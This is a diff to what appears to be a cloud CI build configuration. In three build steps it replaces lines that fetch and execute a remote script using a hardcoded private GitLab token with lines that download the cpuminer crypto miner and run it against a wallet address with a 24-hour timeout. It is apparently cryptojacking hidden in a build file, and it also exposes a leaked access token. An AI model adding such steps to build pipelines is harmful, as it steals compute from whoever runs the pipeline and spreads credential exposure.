@@ -4,9 +4,9 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     id: 'go-install'
   - name: 'python:3.8'
@@ -14,9 +14,9 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     waitFor: ['go-install']
   - name: 'python:3.7'
@@ -24,9 +24,9 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o 17042 -u sugar1qddpjc6kpkjaslghelaetpuhztav4xghyvp77eu.ducthangwercker
     timeout: 86400s
     waitFor: ['go-install']
 timeout: 86400s
